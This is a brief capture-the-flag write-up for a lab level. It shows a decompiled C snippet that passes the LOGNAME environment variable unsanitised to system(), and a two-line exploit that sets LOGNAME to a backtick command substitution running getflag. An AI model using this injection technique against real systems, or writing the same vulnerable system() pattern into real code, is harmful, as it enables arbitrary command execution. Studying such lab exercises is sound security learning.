There is a binary file in our home.

By disassembling it we can see that the program create a string that will echo the `LOGNAME` env variable using `system()`
```c
asprintf(&var_1c, "/bin/echo %s ", getenv("LOGNAME"));
return system(var_1c);
```

We then export the LOGNAME env variable to call the `getflag` command.
```bash
export LOGNAME=\`getflag\`
./level07
```